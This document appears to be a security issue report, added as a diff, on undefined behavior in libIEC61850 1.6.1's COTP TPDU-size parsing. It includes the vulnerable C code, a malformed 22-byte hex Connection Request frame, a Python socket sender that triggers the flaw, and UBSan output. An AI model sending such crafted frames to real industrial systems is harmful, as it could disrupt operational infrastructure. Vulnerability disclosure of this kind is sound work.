@@ -1,0 +1,82 @@
+issue #589
+
+Summary
+A malformed COTP Connection Request can trigger undefined behavior in libIEC61850 1.6.1 when parsing the TPDU size parameter (0xC0).
+The parser reconstructs the requested TPDU size using a signed left shift directly on an untrusted network byte:
+
+int requestedTpduSize = (1 << buffer[bufPos++]);
+When the attacker supplies a large parameter value such as 0xA2 (decimal 162), the shift exponent exceeds the width of a 32-bit int, which is undefined behavior per the C standard. This is reliably flagged by UndefinedBehaviorSanitizer during COTP connection establishment.
+
+Details
+File: src/mms/iso_cotp/cotp.c, line 481, COTP option parsing path.
+
+Relevant code:
+
+case 0xc0:
+{
+    if (parameterLen == 1) {
+        int requestedTpduSize = (1 << buffer[bufPos++]);
+        CotpConnection_setTpduSize(self, requestedTpduSize);
+    }
+    else {
+        bufPos += parameterLen;
+    }
+}
+break;
+The issue is that buffer[bufPos] is attacker-controlled network input from the COTP CR variable part.
+If the byte is outside the valid TPDU-size code range, the code still feeds it directly into 1 << x.
+
+For example, when the parameter is:
+
+c0 01 a2
+the parser interprets the final byte as the shift exponent:
+
+raw byte = 0xA2
+decimal value = 162
+expression = 1 << 162
+This is undefined behavior per ISO C because the shift count is greater than or equal to the width of the promoted left operand type.
+
+In local testing, this is reported by UBSan as:
+
+src/mms/iso_cotp/cotp.c:481:32: runtime error: shift exponent 162 is too large for 32-bit type 'int'
+SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/mms/iso_cotp/cotp.c:481:32
+This issue is remotely reachable during connection establishment and requires no prior session state.
+
+PoC
+Minimal reproducer over the network (22-byte CR frame):
+
+03 00 00 16 11 e0 00 00 00 01 00 c1 02 00 00 c2 02 00 01 c0 01 a2
+The final three bytes are the malicious COTP parameter:
+
+c0 01 a2
+where:
+
+0xc0 = TPDU size parameter
+0x01 = parameter length
+0xa2 = attacker-controlled invalid TPDU-size code
+A simple Python sender:
+
+import socket
+import sys
+
+host = "127.0.0.1"
+port = int(sys.argv[1])
+
+data = bytes.fromhex(
+    "03 00 00 16 11 e0 00 00 00 01 00 c1 02 00 00 c2 02 00 01 c0 01 a2"
+)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.sendall(data)
+s.shutdown(socket.SHUT_WR)
+s.close()
+Run against server_example_basic_io built with UBSan:
+
+python3 poc_cotp.py 8102
+Expected output on the server:
+
+Connection opened
+src/mms/iso_cotp/cotp.c:481:32: runtime error: shift exponent 162 is too large for 32-bit type 'int'
+SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/mms/iso_cotp/cotp.c:481:32
+Connection closed
